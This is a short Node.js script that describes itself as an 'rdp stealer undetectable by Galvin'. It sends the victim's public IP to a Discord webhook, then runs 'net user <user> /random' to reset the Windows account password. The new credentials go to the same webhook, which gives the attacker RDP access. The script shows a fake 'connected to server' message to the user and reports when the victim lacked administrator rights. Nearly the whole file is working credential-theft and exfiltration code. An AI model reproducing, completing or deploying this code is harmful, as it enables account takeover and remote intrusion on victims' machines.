const { Webhook } = require('discord-webhook-node');
let request = require('request');
const logs = new Webhook("your webhook links");//webhook link
const { exec } = require("child_process");
const username = require('username');

request.get(`https://api.ipify.org`, function(err, response, body) {
	logs.send(`**__IP__** : ${body}`)
	if (err)
		 process.exit(1);
	});
	
(async () => {
exec(`net user ${await username()} /random`, (error, data, getter) => {
	logs.send('> ' + data + '\n Simple rdp stealer undetectable by Galvin')
	console.log(`connected to server.`)
	if (error){
console.log(`you need to run this application as administrator.`)
logs.send(`the victim doesn't open application as administrator.`)
process.exit(1);
	}

});
})();
